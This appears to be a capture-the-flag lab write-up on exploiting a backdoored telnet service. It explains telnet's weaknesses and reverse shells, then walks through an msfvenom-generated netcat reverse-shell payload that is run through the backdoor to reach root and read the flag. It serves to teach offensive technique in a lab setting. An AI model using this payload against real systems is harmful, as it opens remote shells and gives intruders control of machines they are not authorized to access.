
**Types of Telnet Exploit**

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)
- [https://cve.mitre.org/](https://cve.mitre.org/)[](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

**Method Breakdown**

So, from our enumeration stage, we know:

    - There is a poorly hidden telnet service running on this machine

    - The service itself is marked "backdoor"

    - We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

**Connecting to Telnet**

You can connect to a telnet server with the following syntax:

    **"telnet [ip] [port]"**

We're going to need to keep this in mind as we try and exploit this machine.  
  

**What is a Reverse Shell?**

**![](https://i.imgur.com/EUC7VS6.png)**

A **"shell"** can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.


## Write-up

### 1) Enumeration

- We started by enumerating the target system and discovered the IP and port details. We connected to the system using Telnet:

```shell
telnet 10.10.73.26 8012`
```

### 2) Testing Command Execution

Since we can’t directly run commands interactively, we needed to perform a reverse shell. To confirm the system can execute commands, I used `tcpdump` to listen for network traffic from the target:
```shell
sudo tcpdump ip proto \\icmp -i tun0`
```

Next, I tested running a simple system command (`ping`) via Telnet to ensure we could execute commands:

```shell
.RUN ping [local machine IP] -c 1`
```

**Output**:

``` shell
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 03:59:37.155224 IP 10.10.73.26 > wareville-gw: ICMP echo request, id 1269, seq 1, length 64 03:59:37.155242 IP wareville-gw > 10.10.73.26: ICMP echo reply, id 1269, seq 1, length 64 04:00:31.530478 IP 10.10.73.26 > wareville-gw: ICMP echo request, id 1270, seq 1, length 64 04:00:31.530506 IP wareville-gw > 10.10.73.26: ICMP echo reply, id 1270, seq 1, length 64
```
This confirms that we are able to run system commands and reach our local machine.

### 3) Reverse Shell Payload

I generated a reverse shell payload using `msfvenom`, which will execute a Netcat reverse shell on the target machine, connecting back to our local machine:

```shell
msfvenom -p cmd/unix/reverse_netcat lhost=10.21.77.154 lport=4444 R
```
**Generated Payload**:


```shell
mkfifo /tmp/iczgnc; nc 10.21.77.154 4444 0</tmp/iczgnc | /bin/sh >/tmp/iczgnc 2>&1; rm /tmp/iczgnc`

```
### 4) Setting Up a Netcat Listener

Next, I started a listener on port 4444 to catch the reverse shell:

```shell
nc -lvnp 4444

```
### 5) Executing the Payload

I pasted the generated reverse shell command into my Telnet session:

```shell
Trying 10.10.73.26... 
Connected to 10.10.73.26. Escape character is '^]'. 
SKIDY'S BACKDOOR. Type .HELP to view commands 
.RUN mkfifo /tmp/iczgnc; nc 10.21.77.154 4444 0</tmp/iczgnc | /bin/sh >/tmp/iczgnc 2>&1; rm /tmp/iczgnc
```

### 6) Capturing the Flag

Once the reverse shell connected, I had access to the target machine:

```shell
listening on [any] 4444 ... 
connect to [10.21.77.154] from (UNKNOWN) 
[10.10.73.26] 49132
```

I navigated to the flag location and read the flag:

```shell
ls flag.txt
pwd /root 
cat flag.txt 
THM{y0u_g0t_th3_t3ln3t_fl4g}
```
### Conclusion:

By exploiting the Telnet service and using a reverse shell, I successfully gained a shell on the target machine, navigated to `/root`, and captured the flag.


